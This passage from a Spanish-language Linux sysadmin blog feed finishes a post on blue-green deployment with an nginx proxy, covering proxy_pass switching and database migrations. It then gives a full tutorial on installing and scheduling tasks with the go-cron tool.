&lt;h3&gt;Un despliegue fallido&lt;/h3&gt;
&lt;p&gt;Desplegamos una nueva versión en el entorno de pruebas, actualmente como entorno &lt;strong&gt;green&lt;/strong&gt;. Eso significa deplegar nueva versión en &lt;em&gt;green1&lt;/em&gt; y en &lt;em&gt;green2&lt;/em&gt;. Como el entorno de producción es &lt;strong&gt;blue&lt;/strong&gt;, cualquier desastre que pase en &lt;strong&gt;green&lt;/strong&gt; no va a afectar a la operativa.&lt;/p&gt;
&lt;p&gt;Tras subir &lt;strong&gt;green&lt;/strong&gt; a la versión 1.1.0, vemos en el &lt;em&gt;endpoint&lt;/em&gt; de pruebas que no funciona:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;500&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Errors everywhere...&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;500&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Errors everywhere...&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pero no pasa nada; el entorno de producción sigue apuntando a &lt;strong&gt;blue&lt;/strong&gt;, que no hemos modificado y por lo tanto, sigue funcionando con la versión anterior.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basta con no cambiar la configuración del &lt;strong&gt;nginx&lt;/strong&gt; en el servidor &lt;em&gt;proxy&lt;/em&gt; para no exponer el desastre más allá del entorno de pruebas. Si algún manazas hubiera cambiado ya la configuración del &lt;em&gt;proxy&lt;/em&gt;, el &lt;em&gt;rollback&lt;/em&gt; consistiría en modificar de nuevo la configuración del &lt;em&gt;proxy&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Un despliegue con éxito&lt;/h3&gt;
&lt;p&gt;Tras investigar el problema de la nueva versión, se localiza un &lt;em&gt;bug&lt;/em&gt; que causa los errores y se escribe un &lt;em&gt;hotfix&lt;/em&gt;, que se libera como version 1.1.1; supongamos que tenemos éxito.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basta con modificar la configuración del &lt;em&gt;proxy&lt;/em&gt; para que producción apunte a &lt;strong&gt;green&lt;/strong&gt;, en donde tenemos la nueva versión estable. En el caso de la configuración expuesta anteriormente, bastaría con cambiar las directivas &lt;code&gt;proxy_pass&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@proxy:~# cat /etc/nginx/conf.d/api.conf 
upstream blue &lt;span class="o"&gt;{&lt;/span&gt;
    server blue1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server blue2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

upstream green &lt;span class="o"&gt;{&lt;/span&gt;
    server green1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server green2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://green&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://blue&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# nginx -s reload
&lt;span class="m"&gt;2018&lt;/span&gt;/05/07 &lt;span class="m"&gt;17&lt;/span&gt;:43:26 &lt;span class="o"&gt;[&lt;/span&gt;notice&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;21&lt;/span&gt;&lt;span class="c1"&gt;#21: signal process started&lt;/span&gt;
root@proxy:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Puesto que un &lt;em&gt;reload&lt;/em&gt; del &lt;strong&gt;nginx&lt;/strong&gt; no provoca pérdida de paquetes ni de peticiones, solo queda ver que las peticiones del entorno de producción son atendidas en los servidores &lt;em&gt;green1&lt;/em&gt; y &lt;em&gt;green2&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto, el estado de nuestro servicio ha cambiado; ahora tenemos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Entorno de producción en el puerto 80, apuntando al entorno &lt;strong&gt;green&lt;/strong&gt;, con versión 1.1.1&lt;/li&gt;
&lt;li&gt;Entorno de pruebas en el puerto 8080, apuntando al entorno &lt;strong&gt;blue&lt;/strong&gt;, con versión 1.0.0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Por lo tanto, los nuevos despliegues se harían en el entorno &lt;strong&gt;blue&lt;/strong&gt;, que ha dejado de ser el entorno de producción en favor del entorno &lt;strong&gt;green&lt;/strong&gt;. Como pequeño detalle, sería interesante subir &lt;strong&gt;blue&lt;/strong&gt; a la versión nueva, para tener ambos entornos idénticos, como punto de partida para una posible nueva versión.&lt;/p&gt;
&lt;h2&gt;Y que pasa con las bases de datos?&lt;/h2&gt;
&lt;p&gt;En realidad es un problema que no solo atañe a las bases de datos; otras partes &lt;em&gt;stateful&lt;/em&gt; como sistemas de ficheros, colas y APIs remotas también deben ser tratadas en este caso. Este es un tema que no queda bien reflejado, habiendo dos corrientes enfrentadas que defienden sus puntos de vista:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bases de datos duplicadas&lt;/li&gt;
&lt;li&gt;Bases de datos compartidas&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;En caso de duplicar la base de datos en ambos entornos, ganamos la posibilidad de modificarla en nuestros &lt;em&gt;tests&lt;/em&gt;, ya que las pruebas en el entorno de pruebas no van a afectar al entorno de producción. El problema en este punto es que tenemos la necesidad de mantenerlas sincronizadas, pudiendo ser un proceso lento en caso de un conjunto de datos grande.&lt;/p&gt;
&lt;p&gt;Si compartimos la base de datos entre los entornos &lt;strong&gt;blue&lt;/strong&gt; y &lt;strong&gt;green&lt;/strong&gt;, nos ahorramos la sincronización, a costa de no poder modificar nada en el entorno de pruebas, ya que estaríamos modificando los mismos datos que se usan en el entorno de producción.&lt;/p&gt;
&lt;p&gt;Un punto espinoso en esta configuración compartido son las migraciones de la base de datos; hacerlas antes causaría &lt;em&gt;downtime&lt;/em&gt; en la versión anterior hasta instalar la nueva versión, y hacerlas después causaría &lt;em&gt;downtime&lt;/em&gt; en la nueva versión hasta poder hacer la migración. La solución más aceptada es hacer una &lt;em&gt;release&lt;/em&gt; intermedia, capaz de trabajar con la base de datos migrada y sin migrar; sería responsabilidad de esta &lt;em&gt;release&lt;/em&gt; intermedia detectar si la base de datos está migrada o no, y suplir las carencias mediante lógica específica.&lt;/p&gt;</content><category term="blue-green"></category><category term="deployment"></category></entry><entry><title>Un cron alternativo con go: go-cron</title><link href="http://www.linuxsysadmin.ml/2018/05/un-cron-alternativo-con-go-go-cron.html" rel="alternate"></link><published>2018-05-21T10:00:00+02:00</published><updated>2018-05-21T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-05-21:/2018/05/un-cron-alternativo-con-go-go-cron.html</id><summary type="html">&lt;p&gt;Quiero presentar una de esas herramientas que ya existen, pero que alguien ha reescrito con el lenguaje &lt;strong&gt;go&lt;/strong&gt;. Se trata de una utilidad tipo &lt;em&gt;cron&lt;/em&gt;, pero está compilada de forma estática, no necesita de otras librerías y, por lo tanto, lo podemos usar en donde no tengamos permisos de &lt;em&gt;root …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Quiero presentar una de esas herramientas que ya existen, pero que alguien ha reescrito con el lenguaje &lt;strong&gt;go&lt;/strong&gt;. Se trata de una utilidad tipo &lt;em&gt;cron&lt;/em&gt;, pero está compilada de forma estática, no necesita de otras librerías y, por lo tanto, lo podemos usar en donde no tengamos permisos de &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Instalación de go-cron&lt;/h2&gt;
&lt;p&gt;El binario &lt;strong&gt;go-cron&lt;/strong&gt; no depende de librerías externas, tratándose de un binario estático que podemos tener, por ejemplo, en nuestra carpeta personal.&lt;/p&gt;
&lt;p&gt;Su instalación se limita a descargarse el binario de &lt;a href="https://github.com/odise/go-cron/releases"&gt;GitHub&lt;/a&gt; y usar; el fichero descargado es un binario precompilado y comprimido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ wget -O go-cron.gz https://github.com/odise/go-cron/releases/download/v0.0.7/go-cron-linux.gz
...  
Petición HTTP enviada, esperando respuesta... &lt;span class="m"&gt;200&lt;/span&gt; OK
Longitud: &lt;span class="m"&gt;1755640&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,7M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
Grabando a: “go-cron.gz”

go-cron.gz               &lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[====================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;,67M  &lt;span class="m"&gt;1&lt;/span&gt;,49MB/s   en &lt;span class="m"&gt;1&lt;/span&gt;,1s   

&lt;span class="m"&gt;2018&lt;/span&gt;-04-25 &lt;span class="m"&gt;11&lt;/span&gt;:13:41 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,49 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - “go-cron.gz” guardado &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1755640&lt;/span&gt;/1755640&lt;span class="o"&gt;]&lt;/span&gt;

gerard@sirius:~/workspace$ gunzip go-cron.gz 
gerard@sirius:~/workspace$ chmod &lt;span class="m"&gt;755&lt;/span&gt; go-cron 
gerard@sirius:~/workspace$ strip go-cron 
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: El binario viene con los símbolos de &lt;em&gt;debug&lt;/em&gt;; si ejecutamos el comando &lt;em&gt;strip&lt;/em&gt;, lo podemos bajar de 6mb a 4.3mb.&lt;/p&gt;
&lt;h2&gt;Uso de go-cron&lt;/h2&gt;
&lt;p&gt;Empezamos con una visión general de lo que podemos hacer con el binario, que no es mucho:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -h
Usage of ./go-cron &lt;span class="o"&gt;(&lt;/span&gt;build 6f160c2 &lt;span class="o"&gt;)&lt;/span&gt;
./go-cron  &lt;span class="o"&gt;[&lt;/span&gt; OPTIONS &lt;span class="o"&gt;]&lt;/span&gt; -- &lt;span class="o"&gt;[&lt;/span&gt; COMMAND &lt;span class="o"&gt;]&lt;/span&gt;
  -h&lt;span class="o"&gt;=&lt;/span&gt;false: display usage
  -p&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;18080&amp;quot;&lt;/span&gt;: &lt;span class="nb"&gt;bind&lt;/span&gt; healthcheck to a specific port, &lt;span class="nb"&gt;set&lt;/span&gt; to &lt;span class="m"&gt;0&lt;/span&gt; to not open HTTP port at all
  -s&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;* * * * *&amp;quot;&lt;/span&gt;: schedule the task the cron style
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: A diferencia de otras herramienta tipo &lt;em&gt;cron&lt;/em&gt;, esta se encarga de gestionar &lt;strong&gt;una sola tarea&lt;/strong&gt;. Junto con el hecho de que el proceso ejecuta en primer plano, lo hace ideal para su uso en contenedores &lt;strong&gt;docker&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La parte más importante es que demos la especificación temporal (&lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-s&lt;/code&gt;) y el comando a ejecutar. Podemos encontrar documentación para la especificación temporal &lt;a href="https://godoc.org/github.com/robfig/cron"&gt;aquí&lt;/a&gt;. Esta puede ser de 3 tipos: tipo &lt;em&gt;cron&lt;/em&gt;, tiempos preconfigurados y por intervalos.&lt;/p&gt;
&lt;h3&gt;Especificación tipo cron&lt;/h3&gt;
&lt;p&gt;Se trata de dar 5 o 6 valores, que indican respectivamente el segundo, el minuto, la hora, el día del mes, el mes, y -opcionalmente- el día de la semana.&lt;/p&gt;
&lt;p&gt;Estos valores pueden tener intervalos, comodines e incrementos, justo como en el &lt;em&gt;cron&lt;/em&gt; normal. Por ejemplo, para lanzar un comando en el segundo 0, cada 30 minutos, entre las 10 y las 20 horas, los días 1 y 15 del mes de todos los meses, usaríamos algo como esto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -s &lt;span class="s2"&gt;&amp;quot;0 */30 10-20 1,15 *&amp;quot;&lt;/span&gt; -- &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hola&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:19:32 Running version: 6f160c2
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:19:32 new cron: &lt;span class="m"&gt;0&lt;/span&gt; */30 &lt;span class="m"&gt;10&lt;/span&gt;-20 &lt;span class="m"&gt;1&lt;/span&gt;,15 *
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:19:32 Opening port &lt;span class="m"&gt;18080&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; health checking
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Valores preconfigurados&lt;/h3&gt;
&lt;p&gt;Alternativamente, &lt;strong&gt;go-cron&lt;/strong&gt; nos ofrece unos valores preconfigurados que simplifican la expresión, a costa de perder especificaciones más caprichosas. A saber:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@yearly&lt;/code&gt; o &lt;code&gt;@annually&lt;/code&gt; &amp;rarr; Ejecuta cada año, concretamente el 1 de enero (equivale a &lt;code&gt;0 0 0 1 1 *&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@monthly&lt;/code&gt; &amp;rarr; Ejecuta una vez al mes, en el día 1 (equivale a &lt;code&gt;0 0 0 1 * *&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@weekly&lt;/code&gt; &amp;rarr; Ejecuta cada semana, a medianoche del domingo (equivale a &lt;code&gt;0 0 0 * * 0&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@daily&lt;/code&gt; o &lt;code&gt;@midnight&lt;/code&gt; &amp;rarr; Ejecuta una vez al día, a medianoche (equivale a &lt;code&gt;0 0 0 * * *&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@hourly&lt;/code&gt; &amp;rarr; Ejecuta cada hora, a su principio (equivale a &lt;code&gt;0 0 * * * *&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, para ejecutar un &lt;em&gt;backup&lt;/em&gt; diario, podríamos hacer algo como lo siguiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -s &lt;span class="s2"&gt;&amp;quot;@daily&amp;quot;&lt;/span&gt; -- ./backup_database.sh
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:27:45 Running version: 6f160c2
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:27:45 new cron: @daily
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:27:45 Opening port &lt;span class="m"&gt;18080&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; health checking
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Especificación por intervalos&lt;/h3&gt;
&lt;p&gt;También podemos instruir a &lt;strong&gt;go-cron&lt;/strong&gt; para que ejecute cada cierto tiempo, con el &lt;em&gt;keyword&lt;/em&gt; &lt;code&gt;@every&lt;/code&gt;. Esto nos dejaría una línea de comandos como esta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -s &lt;span class="s2"&gt;&amp;quot;@every 1m30s&amp;quot;&lt;/span&gt; -- ./send_keepalive.sh
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:30:25 Running version: 6f160c2
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:30:25 new cron: @every 1m30s
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:30:25 Opening port &lt;span class="m"&gt;18080&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; health checking
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: La primera ejecución se hace cuando ha pasado el tiempo especificado tras levantar &lt;strong&gt;go-cron&lt;/strong&gt;. Las siguientes lo hacen sin tener en cuenta el tiempo de ejecución del comando dado. En caso de ejecutar cada hora, y tardar el &lt;em&gt;script&lt;/em&gt; 40 minutos, saltaría el siguiente en unos 20 minutos tras la finalización del actual; en casos extremos, podríamos tener solapamiento de ejecuciones.&lt;/p&gt;
&lt;h3&gt;El servicio de healthcheck&lt;/h3&gt;
&lt;p&gt;El &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-p&lt;/code&gt; sirve para indicar el puerto en el que vamos a contar con un &lt;em&gt;webservice&lt;/em&gt; con información de lo que pasa en &lt;strong&gt;go-cron&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -s &lt;span class="s2"&gt;&amp;quot;@every 10s&amp;quot;&lt;/span&gt; -- ./do_something.sh 
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:38:32 Running version: 6f160c2
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:38:32 new cron: @every 10s
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:38:32 Opening port &lt;span class="m"&gt;18080&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; health checking
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://localhost:18080/
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;Running&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;9107&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;Exit_status&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;0&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;Stdout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;Stderr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;ExitTime&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;Pid&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;9107&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;StartingTime&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2018-04-25T12:39:02+02:00&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;Last&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;Exit_status&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;0&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;Stdout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;hello\n&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;Stderr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ExitTime&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2018-04-25T12:38:57+02:00&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;Pid&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;9096&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;StartingTime&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2018-04-25T12:38:52+02:00&amp;quot;&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;Schedule&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;@every 10s&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


